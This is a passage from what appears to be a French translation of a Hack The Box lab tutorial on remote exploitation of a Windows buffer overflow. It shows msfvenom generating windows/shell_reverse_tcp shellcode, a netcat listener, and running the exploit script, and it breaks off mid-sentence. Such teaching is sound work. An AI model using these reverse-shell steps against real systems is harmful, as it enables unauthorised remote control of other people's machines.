Exploitation à distance
===================

* * * * *

Comme nous avons construit et testé notre exploit, nous pouvons maintenant essayer de l'exécuter sur un vrai serveur distant. Nous pouvons utiliser le même exploit sur la cible réelle, et nous n'avons qu'à changer `IP` et `port` dans notre script pour le diriger vers la nouvelle cible et changer le shellcode que nous utilisons dans le script pour quelque chose qui nous enverra une coque inversée.

* * * * *

Inverser Shell Shellcode
------------------------

Tout d'abord, nous devons trouver l'adresse IP de notre machine, qui doit être accessible par le serveur distant (dans le même sous-réseau réseau) :

```
dsgsec@htb[/htb]$ ip -4 a

1 : lo : <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
     ...COUPER...
2 : eth0 : <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
     ...COUPER...
3 : eth1 : <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
     ...COUPER...
5 : tun0 : <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 100
     inet 10.10.15.10/23 brd 10.10.15.255 portée globale tun0

```

L'adresse IP que nous utiliserons est celle de `tun0`, car notre VM se trouve sur le même sous-réseau `10.10.`.

Remarque : Vous devez être connecté au VPN pour pouvoir interagir avec le serveur distant, alors téléchargez la clé VPN au cas où vous voudriez exécuter l'exploit depuis votre propre machine. L'instance PwnBox est déjà connectée au VPN, vous devriez donc pouvoir vous connecter au serveur distant.

Ensuite, nous allons générer le shellcode qui nous enverra un reverse shell, que nous pouvons obtenir avec la charge utile `windows/shell_reverse_tcp` dans `msfvenom`, comme suit :

```
dsgsec@htb[/htb]$ msfvenom -p 'windows/shell_reverse_tcp' LHOST=10.10.15.10 LPORT=1234 -f 'python'

...COUPER...
buf = b""
buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
...COUPER...

```

Nous pouvons modifier notre exploit en copiant la sortie et en l'utilisant dans la fonction `exploit()` pour la variable `buf` .

* * * * *

Exploitation à distance
-------------------

Après cela, nous pouvons démarrer un écouteur `netcat` pour recevoir le shell inverse, comme suit :

```
dsgsec@htb[/htb]$ nc -lvnp 1234

écoute sur [tout] 1234 ...

```

Une fois que nous écoutons, nous pouvons exécuter notre charge utile avec `python win32bof_exploit_remote.py` et attendre que le serveur distant nous envoie un rev
